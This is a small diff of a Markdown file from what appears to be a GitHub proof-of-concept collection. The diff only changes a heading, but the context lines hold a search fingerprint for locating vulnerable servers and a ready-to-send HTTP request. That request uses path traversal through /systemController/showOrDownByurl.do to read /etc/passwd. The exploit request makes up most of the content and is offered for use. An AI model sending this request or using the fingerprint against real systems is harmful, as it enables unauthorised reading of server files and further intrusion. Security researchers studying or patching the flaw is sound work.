@@ -6,7 +6,7 @@ body="plug-in/lhgDialog/lhgdialog.min.js?skin=metro"或者fid="cC2r/XQpJXcYiYFHO
 ```
 ![image](https://github.com/wy876/POC/assets/139549762/0fc82b26-4cd9-4924-b461-aa64aef53160)
 
-## poc
+## POC
 ```
 GET /systemController/showOrDownByurl.do?down=&dbPath=../../../../../../etc/passwd HTTP/1.1
 Host: ip:port
